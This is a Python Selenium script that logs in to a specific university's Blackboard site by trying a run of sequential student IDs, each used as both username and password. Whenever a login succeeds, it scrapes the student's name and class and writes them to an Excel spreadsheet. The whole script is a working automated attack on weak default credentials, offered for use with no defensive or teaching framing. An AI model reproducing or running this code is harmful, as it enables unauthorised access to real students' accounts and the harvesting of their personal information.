#coding:utf-8
import xlwt,time
from math import ceil
from selenium import webdriver
import os.path as op
head = ['StuId','Class','Name']
url = "https://bb.neu.edu.cn/"
id_xpath = '''//*[@id="user_id"]'''
passwd_xpath = '''//*[@id="password"]'''
submit_xpath = '''//*[@id="login"]/table/tbody/tr[3]/td[2]/input'''
info_xpath = '//*[@id="global-nav-link"]'
quit_xpath = '''//*[@id="topframe.logout.label"]'''
error_url = "https://bb.neu.edu.cn/webapps/login/"
xls_path = "/home/andrew/Python/Web/Selenium/StuInfo.xls"

start_id = 20174500
turns = 10
start = time.perf_counter()

def Login(driver,id):
    driver.get(url)
    driver.find_element_by_xpath(id_xpath).clear()
    driver.find_element_by_xpath(id_xpath).send_keys(id)
    driver.find_element_by_xpath(passwd_xpath).clear()
    driver.find_element_by_xpath(passwd_xpath).send_keys(id)
    driver.find_element_by_xpath(submit_xpath).click()

def WriteXls(list):
    ncols = len(head)
    nrows = len(list)+1
    wb = xlwt.Workbook(encoding='utf-8')
    sheet = wb.add_sheet('sheet1')
    for i in range(ncols):
        sheet.write(0,i,label=head[i])
    for i in range(1,nrows):
        info = list[i-1].split(' ')
        for j in range(ncols):
            sheet.write(i,j,info[j])
    wb.save(xls_path)
    if op.isfile(xls_path):
        print("Successfully Saved to Xls")

def Pro(num,total,scale=50):
    count = ceil((num/total)*scale)
    a = '*' * count
    b = '.' * (scale-count)
    c = (num/total)*100
    dur = time.perf_counter() - start
    if count<= total-2:
        print("\r{:^4.2f}%[{}->{}]{:.2f}s".format(c,a,b,dur),end="")
    else:
        print("\r{:^4.2f}%[{}{}]{:.2f}s".format(c,a+'*'*2,b,dur),end="")

def main():
    id = start_id
    list = []
    
    count = 0
    driver = webdriver.Firefox()
    for i in range(turns):
        id = id + 1
        Login(driver,str(id))
        if driver.current_url==error_url:
            #print("{} Failed".format(id))
            count = count + 1
            Pro(count,turns)
            continue
        else:
            #print("\n{} Successful".format(id))
            txt = driver.find_element_by_xpath(info_xpath).get_attribute('textContent')
            info = str(id)+''+txt.split('活')[0]
            list.append(info)
            driver.find_element_by_xpath(quit_xpath).click()
            count = count + 1
            Pro(count,turns)
    print("")
    print("Successfully Crawled {}/{} Students' ids".format(len(list),turns))
    WriteXls(list)

main()

